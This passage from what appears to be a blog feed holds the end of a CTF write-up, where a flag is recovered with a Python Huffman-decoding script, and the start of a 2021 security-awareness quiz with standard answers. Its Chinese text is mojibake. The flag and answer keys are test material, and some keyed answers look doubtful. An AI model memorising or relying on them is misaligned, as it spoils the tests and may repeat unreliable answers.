result:jz7ezl64pjhgx6iun78roljc01bm72vjr7u44dfh9tewz8auzmzdzypet4d9xcehxspktdcgxgeeybmgva5pp9850b9mceifedlos6rehy8isvpzf6u545y50c4y9avuvqq3g1epi6igd6tciby7hep9o33cm3guo4qvcxqpcg6zdi5i1r6mmj6xcq5ummzm6jiniidbn51kppj15dp3zy4o8pww23kggukjrytosbkx8th00zba777e0kkz9e1te3u5i36fiym3pran1zgp2a192x63mnc35dhocqli21s2qby9htvdp82x9t6ai0n0wkvbl080bj3xzpj5m8a3jn67kh0le8v104lwa155n8n5o7y97ypdw6hv7d6rbkppxb3ktxnhttb29zsehww2u2x0fhb2k2p1uafhwrfgx7vha64xjr2ffewd30n9961ozt8dgdikly8cknf36kbh2chj28xrencflag&#123;5rd477a2-6r36-dra9-9d63-49c2e9e5d1e5&#125;f43x61l9v3de9z0hiwfz30l1keik5vx48m4yrausvae6fq1q7b9yb4s4tzqbbkyy2hizvqg26spral8rkz37cuylk1k0wfy8p4zppjujggcvpv9e0nhfopumxecd4zbo5sc76zpx8kvttaohud4ltdw16vmgfgucfw2nnafkuup4a6sgkxpk4nw0ax65j6w2498qoap2pqf4el1tu79k6jagxq4q7injr6pkz8yroz25ymdv7uq8h3k24mgf63gmld1i1jga7yupef74l95xr11l1yemjscrn313u89ilrpm8cfj8x826igbfmfnw98qdkm8i3z1vj8ajsebab9w9afhaccvd8qsv2u8zcohp6bxkjonpfoio896q01vje9o2jp00snunzj6zandlq7l8hldsct3ha4dawq9lq8t3u34fmkxrmwd8o4tmow3028o1rqcjzkg9mubjwr5byx7hn44o38vd50</span><br><span class="line"></span><br><span class="line">#flag&#123;5rd477a2-6r36-dra9-9d63-49c2e9e5d1e5&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4125664125557178524.png"></p><p><strong>é™„ä¸Šè„šæœ¬</strong>ï¼ˆè„šæœ¬æ¥æºäºç½‘ç»œï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># ç»Ÿè®¡å­—ç¬¦å‡ºç°é¢‘ç‡ï¼Œç”Ÿæˆæ˜ å°„è¡¨</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count_frequency</span>(<span class="params">text</span>):</span></span><br><span class="line">    chars = []</span><br><span class="line">    ret = []</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> text:</span><br><span class="line">        <span class="keyword">if</span> char <span class="keyword">in</span> chars:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            chars.append(char)</span><br><span class="line">            ret.append((char, text.count(char)))</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># èŠ‚ç‚¹ç±»</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Node</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, frequency</span>):</span></span><br><span class="line">        self.left = <span class="literal">None</span></span><br><span class="line">        self.right = <span class="literal">None</span></span><br><span class="line">        self.father = <span class="literal">None</span></span><br><span class="line">        self.frequency = frequency</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_left</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.father.left == self</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># åˆ›å»ºå¶å­èŠ‚ç‚¹</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_nodes</span>(<span class="params">frequency_list</span>):</span></span><br><span class="line">    <span class="keyword">return</span> [Node(frequency) <span class="keyword">for</span> frequency <span class="keyword">in</span> frequency_list]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># åˆ›å»ºHuffmanæ ‘</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_huffman_tree</span>(<span class="params">nodes</span>):</span></span><br><span class="line">    queue = nodes[:]</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(queue) &gt; <span class="number">1</span>:</span><br><span class="line">        queue.sort(key=<span class="keyword">lambda</span> item: item.frequency)</span><br><span class="line">        node_left = queue.pop(<span class="number">0</span>)</span><br><span class="line">        node_right = queue.pop(<span class="number">0</span>)</span><br><span class="line">        node_father = Node(node_left.frequency + node_right.frequency)</span><br><span class="line">        node_father.left = node_left</span><br><span class="line">        node_father.right = node_right</span><br><span class="line">        node_left.father = node_father</span><br><span class="line">        node_right.father = node_father</span><br><span class="line">        queue.append(node_father)</span><br><span class="line"> </span><br><span class="line">    queue[<span class="number">0</span>].father = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> queue[<span class="number">0</span>]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># Huffmanç¼–ç </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">huffman_encoding</span>(<span class="params">nodes, root</span>):</span></span><br><span class="line">    huffman_code = [<span class="string">&#x27;&#x27;</span>] * <span class="built_in">len</span>(nodes)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nodes)):</span><br><span class="line">        node = nodes[i]</span><br><span class="line">        <span class="keyword">while</span> node != root:</span><br><span class="line">            <span class="keyword">if</span> node.is_left():</span><br><span class="line">                huffman_code[i] = <span class="string">&#x27;0&#x27;</span> + huffman_code[i]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                huffman_code[i] = <span class="string">&#x27;1&#x27;</span> + huffman_code[i]</span><br><span class="line">            node = node.father</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> huffman_code</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># ç¼–ç æ•´ä¸ªå­—ç¬¦ä¸²</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_str</span>(<span class="params">text, char_frequency, codes</span>):</span></span><br><span class="line">    ret = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> text:</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> char_frequency:</span><br><span class="line">            <span class="keyword">if</span> char == item[<span class="number">0</span>]:</span><br><span class="line">                ret += codes[i]</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># è§£ç æ•´ä¸ªå­—ç¬¦ä¸²</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_str</span>(<span class="params">huffman_str, char_frequency, codes</span>):</span></span><br><span class="line">    ret = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> huffman_str != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> codes:</span><br><span class="line">            <span class="keyword">if</span> item <span class="keyword">in</span> huffman_str <span class="keyword">and</span> huffman_str.index(item) == <span class="number">0</span>:</span><br><span class="line">                ret += char_frequency[i][<span class="number">0</span>]</span><br><span class="line">                huffman_str = huffman_str[<span class="built_in">len</span>(item):]</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    text = raw_input(<span class="string">&#x27;The text to encode:&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">    char_frequency = [(<span class="string">&#x27;j&#x27;</span>, <span class="number">29</span>), (<span class="string">&#x27;z&#x27;</span>, <span class="number">31</span>), (<span class="string">&#x27;7&#x27;</span>, <span class="number">25</span>), (<span class="string">&#x27;e&#x27;</span>, <span class="number">31</span>), (<span class="string">&#x27;l&#x27;</span>, <span class="number">23</span>), (<span class="string">&#x27;6&#x27;</span>, <span class="number">37</span>), (<span class="string">&#x27;4&#x27;</span>, <span class="number">32</span>), (<span class="string">&#x27;p&#x27;</span>, <span class="number">38</span>), (<span class="string">&#x27;h&#x27;</span>, <span class="number">27</span>), (<span class="string">&#x27;g&#x27;</span>, <span class="number">26</span>), (<span class="string">&#x27;x&#x27;</span>, <span class="number">28</span>), (<span class="string">&#x27;i&#x27;</span>, <span class="number">25</span>), (<span class="string">&#x27;u&#x27;</span>, <span class="number">27</span>), (<span class="string">&#x27;n&#x27;</span>, <span class="number">25</span>), (<span class="string">&#x27;8&#x27;</span>, <span class="number">36</span>), (<span class="string">&#x27;0&#x27;</span>, <span class="number">24</span>), (<span class="string">&#x27;o&#x27;</span>, <span class="number">23</span>), (<span class="string">&#x27;c&#x27;</span>, <span class="number">28</span>), (<span class="string">&#x27;y&#x27;</span>, <span class="number">24</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="number">29</span>), (<span class="string">&#x27;b&#x27;</span>, <span class="number">26</span>), (<span class="string">&#x27;m&#x27;</span>, <span class="number">27</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="number">28</span>), (<span class="string">&#x27;v&#x27;</span>, <span class="number">25</span>), (<span class="string">&#x27;d&#x27;</span>, <span class="number">33</span>), (<span class="string">&#x27;f&#x27;</span>, <span class="number">28</span>), (<span class="string">&#x27;9&#x27;</span>, <span class="number">33</span>), (<span class="string">&#x27;t&#x27;</span>, <span class="number">21</span>), (<span class="string">&#x27;w&#x27;</span>, <span class="number">22</span>), (<span class="string">&#x27;a&#x27;</span>, <span class="number">31</span>), (<span class="string">&#x27;r&#x27;</span>, <span class="number">24</span>), (<span class="string">&#x27;s&#x27;</span>, <span class="number">16</span>), (<span class="string">&#x27;k&#x27;</span>, <span class="number">32</span>), (<span class="string">&#x27;5&#x27;</span>, <span class="number">25</span>), (<span class="string">&#x27;q&#x27;</span>, <span class="number">23</span>), (<span class="string">&#x27;3&#x27;</span>, <span class="number">32</span>), (<span class="string">&#x27;&#123;&#x27;</span>, <span class="number">1</span>), (<span class="string">&#x27;-&#x27;</span>, <span class="number">4</span>), (<span class="string">&#x27;&#125;&#x27;</span>, <span class="number">1</span>)]</span><br><span class="line"> </span><br><span class="line">    nodes = create_nodes([item[<span class="number">1</span>] <span class="keyword">for</span> item <span class="keyword">in</span> char_frequency])</span><br><span class="line">    root = create_huffman_tree(nodes)</span><br><span class="line">    codes = huffman_encoding(nodes, root)</span><br><span class="line"> </span><br><span class="line">    huffman_str = <span class="string">&#x27;0111110001000011001010001111011110101010011011011110100000110010111101000010010010001100001110010000011110011101101111011001111101000000111010100000101101001000111100000000010100110100101001011101110010001100011100010010111001100011100110011010011000101010100011011110001111111110111001011100010100101111100001011011001001001000010111110101110111010111100010111011000011001011001101001010010111111001110101000110001001001100101110111101111000110010010111111000111110000101001100100100001001110100101011111101111110011101011101000000100100100011111111001000101110101001001101110001011101101001001001011010000101111111001011111100110010100111111110001001100100010010010011110111110110110001101000010010110110001011010000100011010111110101110000110000010001111111110000101000100101101111000111100101101011001100010101011000110010011111001010011110100100011000101111110111011011000011011010100011011100010001010001010000000001101001010010100111111010010110110011110100101010010101001010100010101011010011110001000011000100001010111001110001100101100001010111011110110111110000001011011111011101101000111111110100111100110011101111100111100101101101101010100110001100100110101011110000011111111100011110011101010011110101010111100111100001000111110111110100010011110011000010000100001100101111101010110101100011100010010100001110001001010110010010010100010101101101001110000101111110101010110110110000010011000111000010001001101101101101100111000011000011010101111010101100101000011011001011000101101110100011110001100111101111011000100110110000111010101101111101001111111111100001000111000001001011111011110010110101011110001110001101010011000101111100001111111011100110101001000011111101111111011001111110001110111110110010111000111011011110010101010110011001110110011110001111010000011010101000111110111011100101100100100100001111101010011101111100110011100000010100101000111100100011001011111000000111111111000000011111111101110111111001110100100000100000011011111010000000011110101110111101101011001111011010101111000010110001101000111000111000001110110111000100011110101100100100011100111100101101010010110101011111110011100100000111011011010101101110111000001001100110111001000111001000000111000110010110000100100010001001111010101000101101111000000110101110011101001011100110111101101111100001111000110001101010000111100100011110001100110111001101011100010101011110111111111100101100101010001101110101101101010101001110100001101011000100001111011011100101011000001001000011011000111011101110011001101110100000010100000101111010000001000011001101101111010011101000000101101101011101001101110000010011110001110100111000101111101010110111010011010011000011000110110010110001001000101101111000010010001011110100010111010100101100101111010100001110111100000100101101011110010110001000111111001000000101110010111010001101101111101110111000010101100100001010101001010010001011101001100101010101001111110000010011010011110101001001001110010110100111011110110000111101000010011111000111111001111010011101011010011100010001111101001110011110101111111111111011010100000010100010010011110100110011011101011101011101100000100111110111100100000101011000110110000010110001001111111111011101011000010101111110111001011101111111100111011101001000111011110110111101001011110011000110011000010011011001001100010010111110000110100001110111100110110100101010010111001001100101111010010001001111111000010111101010110000001110101000111011010111100110101001001110001110001001111110001000010011011110100111011111000101111110011000011010001000101000110011100011001001011000111011100101101000110001110011011101010101001010011101110100100111101011101010011010101010111101110101101000001111100111111010011010111101000101011111101011100101101101001100011001111101111100100111101101101110111111010111010100100101110111000011100001001000011100010101110100111110011001100101111110110100111101000010001000011011110000011010110111010110001110011111110000011110010001011010010111111101010101110010000001010011111011100101000101101010101101101000101000110011101101010110001100101011101110111100000001010000011110011010011000011111110100111011100100111000001101001110111100000101010110000010000100001110111000011111110010010100111111101010110000000000111011010000101100100111001110000001011101100000110110101011001011000111001111110010101111001011011101000010001100011101110010100111000011111001110001100111110110111101010101011001000101011010001100000010001111110011001101111111010110010001111001100111110001110011100010011011100100010011011000110000100101111100111110111101010010001101010011100110001011001111000100011011110100011101011101010111111110000011110110111011110000010111100110011100011010111101111110100000010001111100101100011110001101011111101111111011111011101010001101001000111000101111110101000110011000111011111101111110100001111011110010100011101110111111010101100111000101100100010011101001011110011111001111101110001110111111011100111100010110010011011010100011100101010101010110000001010111001101111100111110010100111000010101111001110011011011111001101110011111001000000000111101011000111110001101010011011000010100100100111011111110010000000101001111111110101100001010000001110100101001111001011011001001001011100101111110&#x27;</span></span><br><span class="line"> </span><br><span class="line">    origin_str = decode_str(huffman_str, char_frequency, codes)</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;Encode result:&#x27;</span> + huffman_str</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;Decode result:&#x27;</span> + origin_str</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> çº¢æ˜è°·æ¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>çº¢æ˜è°·æ¯å®‰å…¨æ„è¯†èµ› 2021</title>
      <link href="2021/04/02/2021%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF%E5%AE%89%E5%85%A8%E6%84%8F%E8%AF%86%E8%B5%9B/"/>
      <url>2021/04/02/2021%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF%E5%AE%89%E5%85%A8%E6%84%8F%E8%AF%86%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<blockquote><p>â€œçº¢æ˜è°·â€æ¯æ•°æ®å®‰å…¨å¤§èµ›-å®‰å…¨æ„è¯†èµ›<br>è¯•å·æ—¶é—´ï¼š2021-04-02 10:00:00 - 2021-04-02 11:30:00<br>è¯•å·è¯´æ˜ï¼šå®‰å…¨æ„è¯†èµ›ï¼Œæ¯é¢˜5åˆ†ï¼Œæ€»åˆ†500åˆ†</p></blockquote><p>ä¸€ã€å•é¡¹é€‰æ‹©é¢˜<br>1ã€ä»¥ä¸‹ä¸å±äºé‡‡ç”¨å¯†ç æŠ€æœ¯å¯¹æ•°æ®æœ¬èº«è¿›è¡Œä¿æŠ¤çš„æ˜¯ï¼ˆï¼‰ã€‚<br>Aã€é˜²ç«å¢™æŠ€æœ¯<br>Bã€ä½¿ç”¨ç°ä»£åŠ å¯†ç®—æ³•å¯¹æ•°æ®è¿›è¡ŒåŠ å¯†ä»¥è·å¾—æœºå¯†æ€§<br>Cã€é‡‡ç”¨æ•°å­—ç­¾åç®—æ³•ç¡®ä¿æ•°æ®æºçš„å¯é æ€§<br>Dã€é‡‡ç”¨æ‚å‡‘ç®—æ³•å’Œå…¬é’¥ç®—æ³•ä¿æŠ¤æ•°æ®å®Œæ•´æ€§<br>æ ‡å‡†ç­”æ¡ˆï¼šA<br>2ã€ç¬¬äºŒçº§ä¿¡æ¯ç³»ç»ŸæŠ½æŸ¥ä¸åŒ…æ‹¬å“ªé¡¹<br>Aã€å­˜å‚¨è¢«æµ‹ç³»ç»Ÿé‡è¦æ•°æ®çš„ä»‹è´¨çš„å­˜æ”¾ç¯å¢ƒ<br>Bã€æ‰€æœ‰äººå‘˜<br>Cã€é‡è¦ç®¡ç†ç»ˆç«¯<br>Dã€ä¿¡æ¯å®‰å…¨ä¸»ç®¡äººå‘˜ã€å„æ–¹é¢çš„è´Ÿè´£äººå‘˜ï¼›<br>æ ‡å‡†ç­”æ¡ˆï¼šB<br>3ã€å¯¹äºé‡‡ç”¨è´¦æˆ·å/å£ä»¤çš„ç½‘ç«™ï¼Œåœ¨å·²çŸ¥ç”¨æˆ·åçš„æƒ…å†µä¸‹å¯¹ç”¨æˆ·å£ä»¤è¿›è¡Œçˆ†ç ´ç©·ä¸¾ã€‚è¯¥å£ä»¤åŒ…å«8ä¸ªå­—ç¬¦ï¼Œä¸”æ‰€æœ‰çš„å­—ç¬¦å±äºå­—æ¯è¡¨çš„å°å†™å­—ç¬¦ï¼Œè¯¥ç©·ä¸¾ï¼ˆï¼‰ä¸ªå­—ç¬¦ç»„åˆæ¥è·å¾—å£ä»¤ï¼Ÿ<br>Aã€21224576<br>Bã€208827064576<br>Cã€201520162818<br>Dã€20445276162016<br>æ ‡å‡†ç­”æ¡ˆï¼šB<br>4ã€ã€Šç½‘ç»œå®‰å…¨æ³•ã€‹æ˜¯ä»¥ç¬¬ï¼ˆï¼‰å·ä¸»å¸­ä»¤æ­£å¼å‘å¸ƒçš„ã€‚<br>Aã€äº”åä¸‰<br>Bã€äº”åå››<br>Cã€äº”åäº”<br>Dã€äº”åå…­<br>æ ‡å‡†ç­”æ¡ˆï¼šA<br>5ã€Diffieå’ŒHellmanè§‚å¯Ÿåˆ°ï¼šä¸–ç•Œä¸Šå­˜åœ¨ä¸€äº›å¾ˆå®¹æ˜“å®Œæˆï¼Œä½†åè¿‡æ¥å¾ˆéš¾å®Œæˆçš„è¡Œä¸ºï¼Œç§°è¿™æ ·çš„è¡Œä¸ºå…·æœ‰()<br>Aã€è€¦åˆæ€§<br>Bã€å•å‘æ€§<br>Cã€æ‹Ÿåˆæ€§<br>Dã€æ··æ²Œæ€§<br>æ ‡å‡†ç­”æ¡ˆï¼šB<br>6ã€æ•°æ®å®‰å…¨çš„ä¸»è¦æŠ€æœ¯æ‰‹æ®µæ˜¯é‡‡ç”¨ï¼ˆï¼‰æ‰‹æ®µæ¥å¯¹æ•°æ®è¿›è¡Œä¸»åŠ¨é˜²æŠ¤ã€‚<br>Aã€æ•°æ®äº‘å­˜å‚¨æ‰‹æ®µ<br>Bã€éšæ„å­˜å‚¨æ‰‹æ®µ<br>Cã€å³æ—¶æ¥æ”¶å­˜å‚¨æ‰‹æ®µ<br>Dã€ç°ä»£ä¿¡æ¯å‚¨å­˜æ‰‹æ®µ<br>æ ‡å‡†ç­”æ¡ˆï¼šD<br>7ã€ä¸‹åˆ—ä¸å±äºèµ„äº§ä¸­çš„ä¿¡æ¯è½½ä½“çš„æ˜¯ï¼ˆï¼‰ã€‚<br>Aã€è½¯ä»¶<br>Bã€ç¡¬ä»¶<br>Cã€å›ºä»¶<br>Dã€æœºæˆ¿<br>æ ‡å‡†ç­”æ¡ˆï¼šD<br>8ã€è¿‘å¹´æ¥å¸¸æœ‰ä¸æ³•åˆ†å­é€šè¿‡IPæ¬ºè¯ˆæ¥è¿›è¡Œç½‘ç»œè¯ˆéª—ï¼Œé€šå¸¸ä¸æ³•åˆ†å­ä¸ä¼šé€šè¿‡ï¼ˆï¼‰è¿™æ ·çš„æ”»å‡»æ‰‹æ®µæ¥å®ŒæˆIPæ¬ºéª—çš„å®æ–½<br>Aã€Non-Blind Spoofing<br>Bã€Blind Spoofing<br>Cã€ACK Flooding<br>Dã€Man in the Middle at Tack<br>æ ‡å‡†ç­”æ¡ˆï¼šC<br>9ã€å¯¹äºè¿æ³•è¡Œä¸ºçš„é€šæŠ¥æ‰¹è¯„å¤„ç½šï¼Œå±äºè¡Œæ”¿å¤„ç½šä¸­çš„æ˜¯ï¼ˆï¼‰<br>Aã€äººèº«è‡ªç”±ç½š<br>Bã€å£°èª‰ç½š<br>Cã€è´¢äº§ç½š<br>Dã€èµ„æ ¼ç½š<br>æ ‡å‡†ç­”æ¡ˆï¼šB<br>10ã€ä¸–ç•Œä¸Šç¬¬ä¸€æ¬¾å†›ç”¨çº§ç½‘ç»œæ”»å‡»æ­¦å™¨æ˜¯ä»¥ä¸‹å“ªç§æœ¨é©¬ç—…æ¯’ï¼Ÿ<br>Aã€Tritonç—…æ¯’<br>Bã€ç«ç‚ç—…æ¯’ï¼ˆFlame)<br>Cã€éœ‡ç½‘ç—…æ¯’<br>Dã€æ²™è’™ç—…æ¯’ï¼ˆShamoon)<br>æ ‡å‡†ç­”æ¡ˆï¼šC<br>11ã€å·¥ä¸šäº’è”ç½‘çš„æ ¸å¿ƒæ˜¯ï¼ˆ ï¼‰<br>Aã€ç½‘ç»œä½“ç³»<br>Bã€åº”ç”¨ä½“ç³»<br>Cã€å¹³å°ä½“ç³»<br>Dã€ç”¨æˆ·ä½“ç³»<br>æ ‡å‡†ç­”æ¡ˆï¼šC<br>12ã€()æ˜¯ä¿¡æ¯ç³»ç»Ÿç­‰çº§ç¡®å®šçš„ç¬¬ä¸‰æ­¥<br>Aã€ç¡®å®šå®šçº§å¯¹è±¡<br>Bã€ä¿¡æ¯ç³»ç»Ÿç­‰çº§è¯„å®¡<br>Cã€åˆæ­¥ç¡®å®šä¿¡æ¯ç³»ç»Ÿç­‰çº§<br>Dã€ä¿¡æ¯ç³»ç»Ÿç­‰çº§çš„æœ€ç»ˆç¡®å®šä¸å®¡æ‰¹<br>æ ‡å‡†ç­”æ¡ˆï¼šB<br>13ã€å…³äºå®‰å…¨å•å…ƒæµ‹è¯„ç»“æœæ±‡æ€»è¡¨ç¬¦å·æè¿°é”™è¯¯çš„æ˜¯<br>Aã€å¯¹å‹¾è¡¨ç¤º<br>Bã€ä¸‰è§’å½¢è¡¨ç¤ºå¾…å®š<br>Cã€å‰è¡¨ç¤ºä¸ç¬¦åˆ<br>Dã€â€œN/Aâ€è¡¨ç¤ºâ€œä¸é€‚ç”¨â€<br>æ ‡å‡†ç­”æ¡ˆï¼šB<br>14ã€PC4Ræ¨¡å‹æ˜¯ä¸€ç§å·¥ä¸šäº’è”ç½‘å®‰å…¨è‡ªé€‚åº”é˜²æŠ¤æ¨¡å‹ï¼Œç»„æˆè¿™ä¸ªæ¨¡å‹çš„æ­¥éª¤ä¸åŒ…æ‹¬ï¼ˆ )<br>Aã€ä¿¡æ¯æ„ŸçŸ¥<br>Bã€é£é™©è¯„å®š<br>Cã€æ•°æ®æ±‡é›†<br>Dã€ç½‘ç»œèåˆ<br>æ ‡å‡†ç­”æ¡ˆï¼šB<br>15ã€å¯¹ç¬¬äº”çº§ä¿¡æ¯ç³»ç»Ÿï¼Œåº”å½“ç”±___è¿›è¡Œæ£€æŸ¥<br>Aã€å…¬å®‰éƒ¨<br>Bã€çŸ¥åå­¦è€…å§”å‘˜ä¼š<br>Cã€æœ‰èµ„è´¨çš„å®‰å…¨ä¼ä¸š<br>Dã€å›½å®¶æŒ‡å®šçš„ä¸“é—¨éƒ¨é—¨<br>æ ‡å‡†ç­”æ¡ˆï¼šD<br>16ã€å·¥ä¸šäº’è”ç½‘æœ¨é©¬ç—…æ¯’è‚†è™ï¼Œå…¶ä¸­æˆ‘ä»¬å¸¸è§çš„Industroyerç—…æ¯’æ”¯æŒçš„å·¥ä¸šæ§åˆ¶åè®®æœ‰ï¼ˆï¼‰<br>Aã€OPC DA Process Control Data Access<br>Bã€IEC60870-5-101<br>Cã€IEC60870-5-104<br>Dã€IEC 62850<br>æ ‡å‡†ç­”æ¡ˆï¼šD<br>17ã€æ ¹æ®ç³»ç»Ÿæ‰€é‡‡ç”¨çš„å®‰å…¨ç­–ç•¥åŠæ‰€å…·å¤‡çš„å®‰å…¨åŠŸèƒ½ï¼ŒTCSECå°†ç³»ç»Ÿåˆ†ä¸º()ç±»å…±()ä¸ªå®‰å…¨ç­‰çº§<br>Aã€3 6<br>Bã€4 6<br>Cã€4 7<br>Dã€6 8<br>æ ‡å‡†ç­”æ¡ˆï¼šC<br>18ã€ç°åœºè¯„æµ‹ä¸€èˆ¬ä»å‡ ä¸ªæ–¹é¢å‡ºå‘,åˆ†åˆ«æ˜¯<br>Aã€å››ä¸ªæ–¹é¢ï¼šè®¿è°ˆã€æ–‡æ¡£å®¡æŸ¥ã€é…ç½®æ£€æŸ¥ã€å®åœ°è€ƒå¯Ÿ<br>Bã€äº”ä¸ªæ–¹é¢ï¼šè®¿è°ˆã€æ–‡æ¡£å®¡æŸ¥ã€é…ç½®æ£€æŸ¥ã€å·¥å…·æµ‹è¯•å’Œå®åœ°å¯Ÿçœ‹<br>Cã€ä¸‰ä¸ªæ–¹é¢ï¼šæ–‡æ¡£å®¡æŸ¥ã€é…ç½®æ£€æŸ¥ã€å®åœ°è€ƒå¯Ÿ<br>Dã€å…­ä¸ªæ–¹é¢ï¼šè®¿è°ˆã€æ–‡æ¡£å®¡æŸ¥ã€é…ç½®æ£€æŸ¥ã€å·¥å…·æµ‹è¯•ã€å®åœ°å¯Ÿçœ‹ï¼Œäººå‘˜æµ‹è¯•<br>æ ‡å‡†ç­”æ¡ˆï¼šB<br>19ã€åœ¨ä¼ ç»Ÿçš„ä¿¡æ¯ç³»ç»Ÿå®‰å…¨é¢†åŸŸä¸­ï¼Œæˆ‘ä»¬å°†å®‰å…¨çš„ä¸‰ç§åŸºæœ¬å±æ€§ç®€ç§°ä¸ºCIAï¼Œä»¥ä¸‹å“ªä¸€ä¸ªé€‰é¡¹ä¸å±äºå®‰å…¨çš„ä¸‰ç§åŸºæœ¬å±æ€§<br>Aã€å®æ—¶æ€§<br>Bã€å®Œæ•´æ€§<br>Cã€ä¿å¯†æ€§<br>Dã€å¯ç”¨æ€§<br>æ 